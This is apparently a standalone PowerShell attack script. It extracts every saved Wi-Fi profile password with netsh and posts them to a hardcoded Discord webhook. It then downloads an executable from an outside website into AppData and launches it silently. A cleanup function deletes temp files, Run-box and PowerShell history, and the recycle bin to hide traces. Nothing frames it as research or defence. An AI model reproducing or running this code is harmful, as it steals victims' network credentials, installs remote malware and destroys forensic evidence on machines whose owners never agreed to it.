# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1448171091561418896/qbtM5A8JrB-cV4HhDEM8itLK4zu2VlR5hWaFnPxwTwdXXMGf0nJkXLxNp0EiHfQl4P8m"

function Get-WiFiPasswords {
	$credentials = @()

	netsh wlan show profile |
		Select-String '(?<=All User Profile\s+:\s).+' |
		ForEach-Object {
			$wlan = $_.Matches.Value
			$passw = netsh wlan show profile $wlan key=clear |
				Select-String '(?<=Key Content\s+:\s).+'

			$credentials += [pscustomobject]@{
				Name     = $wlan
				Password = $passw.Matches.Value
			}
		}
	return ($credentials | Out-String)
}

function SendString-ToDiscord {
    param([string]$data)
	
	$payload = [PSCustomObject]@{
		content = $data
	}

	Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
}

############################################################################################################################################
function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################

# Main execution - completely silent
try {
    Get WiFi passwords
    $wifiPasswords = Get-WiFiPasswords
    
    SendString-ToDiscord $wifiPasswords

    $url = "https://jaedan.org/ta.exe"
    $filePath = Join-Path -Path $env:APPDATA -ChildPath "temp\nka.exe"
    $dir = Split-Path $filePath -Parent
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory | Out-Null
    }
    Invoke-WebRequest -Uri $url -OutFile $filePath
    Start-Process -FilePath $filePath
    
    #Clean-Exfil
    
    # Exit silently
    exit 0
}
catch {
    Clean-Exfil
    exit 1
}